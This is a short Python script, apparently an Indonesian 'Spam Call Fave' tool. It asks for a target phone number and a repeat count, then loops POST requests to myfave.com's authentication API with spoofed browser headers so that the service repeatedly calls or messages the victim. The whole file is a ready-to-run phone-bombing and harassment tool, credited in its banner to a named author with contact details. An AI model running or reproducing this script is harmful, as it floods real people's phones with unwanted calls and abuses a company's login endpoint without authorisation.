# -*- coding: utf-8 -*-
import requests, json, time, os, sys
from fake_useragent import UserAgent
ua = UserAgent()
def tunggu(t):
        while t:
                wd='\x1b[1;96m[#] Jeda selama '+str(t)+" detik "
                print(wd,end='\r',flush=True)
                time.sleep(1)
                t -= 1
def kontol(prompt):
    while True:
        try:
            return int(input(prompt))
        except ValueError:
            print("\x1b[1;96m[!] Error | Jumlah hanya berisi angka")
hd = {
"Host": "api.myfave.com",
"Connection": "keep-alive",
"x-user-agent": "Fave-PWA/v1.0.0",
"User-Agent": ua.random,
"content-type": "application/json",
"Accept": "*/*",
"Origin": "https://m.myfave.com",
"Referer": "https://m.myfave.com/jakarta/auth",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
os.system('clear')
print ("""\n \x1b[1;34m▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄               ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌             ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▐░▌           ▐░▌ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌  ▐░▌         ▐░▌  ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌   ▐░▌       ▐░▌   ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ▐░▌     ▐░▌    ▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░▌   ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌      ▐░▌ ▐░▌      ▐░▌          
▐░▌          ▐░▌       ▐░▌       ▐░▐░▌       ▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌          ▐░▌       ▐░▌        ▐░▌        ▐░░░░░░░░░░░▌
 ▀            ▀         ▀          ▀          ▀▀▀▀▀▀▀▀▀▀▀ 
                                                          \n""")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Call Fave | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
nom = input("\x1b[1;33m[~] Contoh : 628xxx\n[•] Masukkan nomor target : ")
jml = kontol("\x1b[37m[~] Masukkan jumlah : ")

for i in range(jml):
    dat = {"phone":nom}
    r = requests
    x = r.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=hd).text
    if "6c047709f9da4291a568fa84b97b6d47" in x:
       print("\x1b[1;31m[~] Gagal mengirim spam ke "+nom)
    else:
       print("\x1b[1;32m[✓] Sukses mengirim spam ke "+nom)
       tunggu(60)
